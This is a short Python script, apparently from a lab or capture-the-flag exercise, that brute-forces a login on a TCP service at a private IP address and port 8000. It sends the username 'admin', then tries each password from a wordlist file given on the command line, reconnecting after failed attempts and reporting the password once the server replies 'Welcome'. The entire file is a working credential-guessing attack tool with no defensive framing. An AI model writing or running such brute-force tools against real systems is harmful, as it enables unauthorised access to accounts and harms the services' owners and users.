import __main__
import socket
import sys


passwords = []


def handle_server(i):
    
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        HOST = '10.65.164.137'
        PORT = 8000
        
        s.connect((HOST,PORT))
        username = 'admin'
        s.sendall(str(username).encode("utf-8"))
        response1 = s.recv(4096).decode("utf-8")
        print(response1 + "\n")
        try:
            
            #sys.stdout.write(str(data).strip())

            for line in passwords[i:]:
                i += 1
                sys.stdout.write(line)
                s.sendall((line).encode("utf-8"))
                response = s.recv(4096).decode("utf-8")
                check3 = 'Welcome'
                sys.stdout.write(response)
                if(str(response).strip() == "Password:"):
                    sys.stdout.write("not found" + " index : " + f"{i}" + "\n")
                    return i
                if(check3 in str(response).strip()):
                    sys.stdout.write("password found : " + str(line).strip())
                    i = len(passwords)
                    return i         
                                     
        except Exception as e:
            print(f"Error: {e}")
            
    


if __name__ == "__main__":
    file = sys.argv[1]
    i = 0
    with open(file, "r") as f:
        passwords = [line for line in f]
    
    while i != len(passwords):
        i = handle_server(i)  
    